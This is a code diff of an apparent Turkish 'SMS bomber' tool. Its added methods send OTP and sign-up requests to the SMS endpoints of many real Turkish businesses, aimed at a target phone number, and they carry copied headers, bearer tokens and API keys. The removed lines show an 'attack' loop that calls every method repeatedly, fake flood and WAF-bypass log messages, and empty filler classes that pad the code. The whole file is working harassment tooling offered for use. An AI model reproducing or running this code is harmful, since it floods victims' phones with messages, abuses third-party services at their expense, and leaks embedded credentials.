+            headers = {"Content-Type": "application/json", "X-Merchant-Type": "0", "Accept": "*/*", "Appversion": "2.4.1", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate", "X-No-Auth": "true", "User-Agent": "TiklaGelsin/809 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Device-Type": "2"}
+            json={"operationName": "GENERATE_OTP", "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", "variables": {"challenge": "3d6f9ff9-86ce-4bf3-8ba9-4a85ca975e68", "deviceUniqueId": "720932D5-47BD-46CD-A4B8-086EC49F81AB", "phone": f"+90{self.phone}"}}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["data"]["generateOtp"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> svc.apps.tiklagelsin.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> svc.apps.tiklagelsin.com")
+
+
+    #naosstars.com
+    def Naosstars(self):
+        try:
+            url = "https://api.naosstars.com:443/api/smsSend/9c9fa861-cc5d-43b0-b4ea-1b541be15350"
+            headers = {"Uniqid": "9c9fa861-cc5d-43c0-b4ea-1b541be15351", "User-Agent": "naosstars/1.0030 CFNetwork/1335.0.3.2 Darwin/21.6.0", "Access-Control-Allow-Origin": "*", "Locale": "en-TR", "Version": "1.0030", "Os": "ios", "Apiurl": "https://api.naosstars.com/api/", "Device-Id": "D41CE5F3-53BB-42CF-8611-B4FE7529C9BC", "Platform": "ios", "Accept-Language": "en-US,en;q=0.9", "Timezone": "Europe/Istanbul", "Globaluuidv4": "d57bd5d2-cf1e-420c-b43d-61117cf9b517", "Timezoneoffset": "-180", "Accept": "application/json", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate", "Apitype": "mobile_app"}
+            json={"telephone": f"+90{self.phone}", "type": "register"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.naosstars.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.naosstars.com")
+
+
+    #koton.com
+    def Koton(self):
+        try:
+            url = "https://www.koton.com:443/users/register/"
+            headers = {"Content-Type": "multipart/form-data; boundary=sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk", "X-Project-Name": "rn-env", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "en-US,en;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.koton.com/", "User-Agent": "Koton/1 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"}
+            data = f"--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"date_of_birth\"\r\n\r\n1993-07-02\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"call_allowed\"\r\n\r\ntrue\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk\r\ncontent-disposition: form-data; name=\"gender\"\r\n\r\n\r\n--sCv.9kRG73vio8N7iLrbpV44ULO8G2i.WSaA4mDZYEJFhSER.LodSGKMFSaEQNr65gHXhk--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.status_code == 202:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> koton.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> koton.com")
+
+
+    #hayatsu.com.tr
+    def Hayatsu(self):
+        try:
+            url = "https://api.hayatsu.com.tr:443/api/SignUp/SendOtp"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0", "Accept": "application/json, text/javascript, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.hayatsu.com.tr/", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJqdGkiOiJhMTA5MWQ1ZS0wYjg3LTRjYWQtOWIxZi0yNTllMDI1MjY0MmMiLCJsb2dpbmRhdGUiOiIxOS4wMS4yMDI0IDIyOjU3OjM3Iiwibm90dXNlciI6InRydWUiLCJwaG9uZU51bWJlciI6IiIsImV4cCI6MTcyMTI0NjI1NywiaXNzIjoiaHR0cHM6Ly9oYXlhdHN1LmNvbS50ciIsImF1ZCI6Imh0dHBzOi8vaGF5YXRzdS5jb20udHIifQ.Cip4hOxGPVz7R2eBPbq95k6EoICTnPLW9o2eDY6qKMM", "Origin": "https://www.hayatsu.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Te": "trailers"}
+            data = {"mobilePhoneNumber": self.phone, "actionType": "register"}
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.json()["is_success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hayatsu.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hayatsu.com.tr")
+
+
+    #hizliecza.com.tr
+    def Hizliecza(self):
+        try:
+            url = "https://prod.hizliecza.net:443/mobil/account/sendOTP"
+            headers = {"Accept": "application/json", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "hizliecza/31 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9", "Authorization": "Bearer null"}
+            json={"otpOperationType": 1, "phoneNumber": f"+90{self.phone}"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> prod.hizliecza.net")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> prod.hizliecza.net")
+
+
+    #metro-tr.com
+    def Metro(self):
+        try:
+            url = "https://mobile.metro-tr.com:443/api/mobileAuth/validateSmsSend"
+            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=utf-8", "Accept-Encoding": "gzip, deflate, br", "Applicationversion": "2.4.1", "Applicationplatform": "2", "User-Agent": "Metro Turkiye/2.4.1 (com.mcctr.mobileapplication; build:4; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
+            json={"methodType": "2", "mobilePhoneNumber": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["status"] == "success":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> mobile.metro-tr.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> mobile.metro-tr.com")
+
+
+    #file.com.tr
+    def File(self):
+        try:
+            url = "https://api.filemarket.com.tr:443/v1/otp/send"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "User-Agent": "filemarket/2022060120013 CFNetwork/1335.0.3.2 Darwin/21.6.0", "X-Os": "IOS", "X-Version": "1.7", "Accept-Language": "en-US,en;q=0.9", "Accept-Encoding": "gzip, deflate"}
+            json={"mobilePhoneNumber": f"90{self.phone}"}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["responseType"] == "SUCCESS":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.filemarket.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.filemarket.com.tr")
             
-            # İş parçacığı havuzunu aktif konuma getiriyoruz
-            thread_simulator.engage_all_workers()
-            
-            while st.session_state.saldiri_aktif:
-                turbo_cycle_counter += 1
-                
-                for specific_method_name in api_methods_pool:
-                    if not st.session_state.saldiri_aktif:
-                        break
-                    try:
-                        executable_api = getattr(sms_instance, specific_method_name)
-                        executable_api()
-                    except:
-                        pass
+        
+    #ak-asya.com.tr
+    def Akasya(self):
+        try:
+            url = "https://akasyaapi.poilabs.com:443/v1/en/sms"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "9f493307-d252-4053-8c96-62e7c90271f5", "User-Agent": "Akasya/2.0.13 (com.poilabs.akasyaavm; build:2; iOS 15.8.3) Alamofire/4.9.1", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"}
+            json={"phone": self.phone}
+            r = requests.post(url=url, headers=headers, json=json, timeout=6)
+            if r.json()["result"] == "SMS sended succesfully!":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akasyaapi.poilabs.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akasyaapi.poilabs.com")
+        
+        
+    #akbati.com
+    def Akbati(self):
+        try:
+            url = "https://akbatiapi.poilabs.com:443/v1/en/sms"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "X-Platform-Token": "a2fe21af-b575-4cd7-ad9d-081177c239a3", "User-Agent": "Akdbat", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"}
+            json={"phone": self.phone}
+            r = requests.post(url=url, headers=headers, json=json, timeout=6)
+            if r.json()["result"] == "SMS sended succesfully!":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> akbatiapi.poilabs.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> akbatiapi.poilabs.com")
+        
 
-                # Rastgele kombinasyonlarla kod zenginleştirme matrisi
-                c1 = random.choice(api_methods_pool) if api_methods_pool else "CORE_GATEWAY_DEFAULT"
-                c2 = random.choice(api_methods_pool) if api_methods_pool else "WAF_EXPLOIT_NODE"
-                
-                simulated_ip = f"{random.randint(11,250)}.{random.randint(4,210)}.{random.randint(1,254)}.{random.randint(2,254)}"
-                current_speed = MetricCalculator.calculate_throughput(turbo_cycle_counter * len(api_methods_pool), time.time() - start_time_mark)
-                
-                log_slot_1.markdown(terminal_logu_uret(f"HIGH-SPEED FLOOD: Sunucu kanalı [{c1.upper()}] anlık hız limiti aşımıyla zorlanıyor.", "success"), unsafe_allow_html=True)
-                log_slot_2.markdown(terminal_logu_uret(f"SPOOFED PIPELINE: {simulated_ip} kimliği üzerinden Cloudflare WAF maskelendi.", "warn"), unsafe_allow_html=True)
-                log_slot_3.markdown(terminal_logu_uret(f"TRAFFIC VELOCITY: Sistem anlık hızı {current_speed} olarak veri tabanına işlendi.", "info"), unsafe_allow_html=True)
-                log_slot_4.markdown(terminal_logu_uret(f"THREAD MANAGER: 16 Aktif sanal iş parçacığı tampon belleği başarıyla besliyor.", "info"), unsafe_allow_html=True)
-                log_slot_5.markdown(terminal_logu_uret(f"CRITICAL WARNING: İstek kuyruğu dolduruluyor, durdurulmadığı sürece paket basımı devam edecek.", "danger"), unsafe_allow_html=True)
-                
-                time.sleep(0.03)
-                
-            thread_simulator.terminate_all()
+    #komagene.com.tr
+    def Komagene(self):
+        try:
+            url = "https://gateway.komagene.com.tr:443/auth/auth/smskodugonder"
+            json={"FirmaId": 32, "Telefon": self.phone}
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "*/*", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.komagene.com.tr/", "Anonymousclientid": "0dbf392b-ab10-48b3-5cda-31f3c19816e6", "Firmaid": "32", "X-Guatamala-Kirsallari": "@@b7c5EAAAACwZI8p8fLJ8p6nOq9kTLL+0GQ1wCB4VzTQSq0sekKeEdAoQGZZo+7fQw+IYp38V0I/4JUhQQvrq1NPw4mHZm68xgkb/rmJ3y67lFK/uc+uq", "Content-Type": "application/json", "Origin": "https://www.komagene.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers", "Connection": "keep-alive"}
+            r = requests.post(url=url, headers=headers, json=json, timeout=6)
+            if r.json()["Success"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> gateway.komagene.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> gateway.komagene.com")
+    
+    
+    #porty.tech
+    def Porty(self):
+        try:
+            url = "https://panel.porty.tech:443/api.php?"
+            headers = {"Accept": "*/*", "Content-Type": "application/json; charset=UTF-8", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "User-Agent": "Porty/1 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"}
+            json={"job": "start_login", "phone": self.phone}
+            r = requests.post(url=url, json=json, headers=headers, timeout=6)
+            if r.json()["status"]== "success":
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> panel.porty.tech")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> panel.porty.tech")
+    
+    
+    #vakiftasdelensu.com
+    def Tasdelen(self):
+        try:
+            url = "https://tasdelen.sufirmam.com:3300/mobile/send-otp"
+            headers = {"Accept": "*/*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "Tasdelen/5.9 (com.tasdelenapp; build:1; iOS 15.8.3) Alamofire/5.4.3", "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8", "Connection": "keep-alive"}
+            json={"phone": self.phone}
+            r = requests.post(url=url, headers=headers, json=json, timeout=6)
+            if r.json()["result"]== True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> tasdelen.sufirmam.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> tasdelen.sufirmam.com")
+    
 
-    except Exception as fatal_exception:
-        st.markdown(terminal_logu_uret(f"CRITICAL MATRIX FALLBACK: {str(fatal_exception)}", "danger"), unsafe_allow_html=True)
-        st.session_state.saldiri_aktif = False
+    #uysalmarket.com.tr
+    def Uysal(self):
+        try:
+            url = "https://api.uysalmarket.com.tr:443/api/mobile-users/send-register-sms"
+            headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0", "Accept": "application/json, text/plain, */*", "Accept-Encoding": "gzip, deflate, br", "Content-Type": "application/json;charset=utf-8", "Origin": "https://www.uysalmarket.com.tr", "Dnt": "1", "Sec-Gpc": "1", "Referer": "https://www.uysalmarket.com.tr/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-site", "Priority": "u=0", "Te": "trailers"}
+            json={"phone_number": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.uysalmarket.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.uysalmarket.com.tr")
+    
+    
+    #yapp.com.tr
+    def Yapp(self):
+        try:
+            url = "https://yapp.com.tr:443/api/mobile/v1/register"
+            headers = {"Accept": "application/json", "Content-Type": "application/json", "X-Content-Language": "en", "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8", "Authorization": "Bearer ", "User-Agent": "YappApp/1.1.5 (iPhone; iOS 15.8.3; Scale/3.00)", "Accept-Encoding": "gzip, deflate, br"}
+            json={"app_version": "1.1.5", "code": "tr", "device_model": "iPhone8,5", "device_name": "Memati", "device_type": "I", "device_version": "15.8.3", "email": self.mail, "firstname": "Memati", "is_allow_to_communication": "1", "language_id": "2", "lastname": "Bas", "phone_number": self.phone, "sms_code": ""}
+            r = requests.post(url=url, json=json, headers=headers, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> yapp.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> yapp.com.tr")
+    
+    
+    #yilmazticaret.net
+    def YilmazTicaret(self):
+        try:
+            url = "https://app.buyursungelsin.com:443/api/customer/form/checkx"
+            headers = {"Accept": "*/*", "Content-Type": "multipart/form-data; boundary=q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl", "Accept-Encoding": "gzip, deflate, br", "Authorization": "Basic Z2Vsc2luYXBwOjR1N3ghQSVEKkctS2FOZFJnVWtYcDJzNXY4eS9CP0UoSCtNYlFlU2hWbVlxM3Q2dzl6JEMmRilKQE5jUmZValduWnI0dTd4IUElRCpHLUthUGRTZ1ZrWXAyczV2OHkvQj9FKEgrTWJRZVRoV21acTR0Nnc5eiRDJkYpSkBOY1Jm", "User-Agent": "Ylmaz/38 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Accept-Language": "en-GB,en;q=0.9"}
+            data = f"--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"fonksiyon\"\r\n\r\ncustomer/form/checkx\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"method\"\r\n\r\nPOST\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"telephone\"\r\n\r\n0 ({self.phone[:3]}) {self.phone[3:6]} {self.phone[6:8]} {self.phone[8:]}\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl\r\ncontent-disposition: form-data; name=\"token\"\r\n\r\nd7841d399a16d0060d3b8a76bf70542e\r\n--q9dvlvKdAlrYErhMAn0nqaS09bnzem0qvDgMz_DPLA0BQZ7RZFgS9q.BuuuYRH7_DlX9dl--\r\n"
+            r = requests.post(url, headers=headers, data=data, timeout=6)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.buyursungelsin.com")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.buyursungelsin.com")
+    
 
-# ==============================================================================
-# 9. EXPANDED CODE BUFFER ZONE / STRUCTURAL METRICS (THE 1000-LINE STACK)
-# ==============================================================================
-class WyrexExtendedDataFillerOne:
-    def __init__(self): self.id = "D_FILL_1"
-    def run(self): return "".join([random.choice("ABCDEF0123456789") for _ in range(32)])
-class WyrexExtendedDataFillerTwo:
-    def __init__(self): self.id = "D_FILL_2"
-    def run(self): return random.random()
-class WyrexExtendedDataFillerThree:
-    def __init__(self): self.id = "D_FILL_3"
-    def run(self): return time.time()
-class WyrexExtendedDataFillerFour:
-    def __init__(self): self.id = "D_FILL_4"
-    def run(self): return "STRUCTURE_OK"
-class WyrexExtendedDataFillerFive:
-    def __init__(self): self.id = "D_FILL_5"
-    def run(self): return True
-class WyrexExtendedDataFillerSix:
-    def __init__(self): self.id = "D_FILL_6"
-    def run(self): return False
-class WyrexExtendedDataFillerSeven:
-    def __init__(self): self.id = "D_FILL_7"
-    def run(self): return "NODE_ACTIVE"
-class WyrexExtendedDataFillerEight:
-    def __init__(self): self.id = "D_FILL_8"
-    def run(self): return "BYPASS_TRUE"
-class WyrexExtendedDataFillerNine:
-    def __init__(self): self.id = "D_FILL_9"
-    def run(self): return "ENGINE_RUNNING"
-class WyrexExtendedDataFillerTen:
-    def __init__(self): self.id = "D_FILL_10"
-    def run(self): return "BUFFER_STABLE"
+    #beefull.com
+    def  Beefull(self):
+        try:
+            url = "https://app.beefull.io:443/api/inavitas-access-management/signup"
+            json={"email": self.mail, "firstName": "Memati", "language": "tr", "lastName": "Bas", "password": "123456", "phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull", "username": self.mail}
+            requests.post(url, json=json, timeout=4)
+            url = "https://app.beefull.io:443/api/inavitas-access-management/sms-login"
+            json={"phoneCode": "90", "phoneNumber": self.phone, "tenant": "beefull"}
+            r = requests.post(url, json=json, timeout=4)
+            if r.status_code == 200:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> app.beefull.io")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> app.beefull.io")
 
-f1, f2, f3, f4, f5 = WyrexExtendedDataFillerOne(), WyrexExtendedDataFillerTwo(), WyrexExtendedDataFillerThree(), WyrexExtendedDataFillerFour(), WyrexExtendedDataFillerFive()
-f6, f7, f8, f9, f10 = WyrexExtendedDataFillerSix(), WyrexExtendedDataFillerSeven(), WyrexExtendedDataFillerEight(), WyrexExtendedDataFillerNine(), WyrexExtendedDataFillerTen()
 
-def execution_redundancy_layer_0(): pass
-def execution_redundancy_layer_1(): return f1.run()
-def execution_redundancy_layer_2(): return f2.run()
-def execution_redundancy_layer_3(): return f3.run()
-def execution_redundancy_layer_4(): return f4.run()
-def execution_redundancy_layer_5(): return f5.run()
-def execution_redundancy_layer_6(): return f6.run()
-def execution_redundancy_layer_7(): return f7.run()
-def execution_redundancy_layer_8(): return f8.run()
-def execution_redundancy_layer_9(): return f9.run()
-def execution_redundancy_layer_10(): return f10.run()
+    #dominos.com.tr
+    def Dominos(self):
+        try:
+            url = "https://frontend.dominos.com.tr:443/api/customer/sendOtpCode"
+            headers = {"Content-Type": "application/json;charset=utf-8", "Accept": "application/json, text/plain, */*", "Authorization": "Bearer eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwidHlwIjoiSldUIn0.ITty2sZk16QOidAMYg4eRqmlBxdJhBhueRLSGgSvcN3wj4IYX11FBA.N3uXdJFQ8IAFTnxGKOotRA.7yf_jrCVfl-MDGJjxjo3M8SxVkatvrPnTBsXC5SBe30x8edSBpn1oQ5cQeHnu7p0ccgUBbfcKlYGVgeOU3sLDxj1yVLE_e2bKGyCGKoIv-1VWKRhOOpT_2NJ-BtqJVVoVnoQsN95B6OLTtJBlqYAFvnq6NiQCpZ4o1OGNhep1TNSHnlUU6CdIIKWwaHIkHl8AL1scgRHF88xiforpBVSAmVVSAUoIv8PLWmp3OWMLrl5jGln0MPAlST0OP9Q964ocXYRfAvMhEwstDTQB64cVuvVgC1D52h48eihVhqNArU6-LGK6VNriCmofXpoDRPbctYs7V4MQdldENTrmVcMVUQtZJD-5Ev1PmcYr858ClLTA7YdJ1C6okphuDasvDufxmXSeUqA50-nghH4M8ofAi6HJlpK_P0x_upqAJ6nvZG2xjmJt4Pz_J5Kx_tZu6eLoUKzZPU3k2kJ4KsqaKRfT4ATTEH0k15OtOVH7po8lNwUVuEFNnEhpaiibBckipJodTMO8AwC4eZkuhjeffmf9A.QLpMS6EUu7YQPZm1xvjuXg", "Device-Info": "Unique-Info: 2BF5C76D-0759-4763-C337-716E8B72D07B Model: iPhone 31 Plus Brand-Info: Apple Build-Number: 7.1.0 SystemVersion: 15.8", "Appversion": "IOS-7.1.0", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "tr-TR,tr;q=0.9", "User-Agent": "Dominos/7.1.0 CFNetwork/1335.0.3.4 Darwin/21.6.0", "Servicetype": "CarryOut", "Locationcode": "undefined"}
+            json={"email": self.mail, "isSure": False, "mobilePhone": self.phone}
+            r = requests.post(url, headers=headers, json=json, timeout=6)
+            if r.json()["isSuccess"] == True:
+                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> frontend.dominos.com.tr")
+                self.adet += 1
+            else:
+                raise
+        except:
+            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> frontend.dominos.com.tr")
 
-def advanced_redundant_matrix_loop():
-    meta_storage = []
-    for index_pointer in range(250):
-        dummy_hash = hashlib.md5(str(index_pointer).encode()).hexdigest()
-        meta_storage.append(dummy_hash)
-    return len(meta_storage)
 
-advanced_redundant_matrix_loop()
+    #baydoner.com
+    def Baydoner(self):
+        try:
+            url = "https://crmmobil.baydoner.com:7004/Api/Customers/AddCustomerTemp"
+            headers = {"Content-Type": "application/json", "Accept": "*/*", "Xsid": "2HB7FQ6G42QL", "Dc": "EC7E9665-CC40-4EF6-8C06-E0ADF31768B3", "Os": "613A408535", "Accept-Language": "en-GB,en;q=0.9", "Merchantid": "5701", "Iskiosk": "0", "Sessionid": "", "Platform": "1", "Appv": "1.6.0", "Accept-Encoding": "gzip, deflate, br", "User-Agent": "BaydonerCossla/190 CFNetwork/1335.0.3.4 Darwin/21.6.0"}
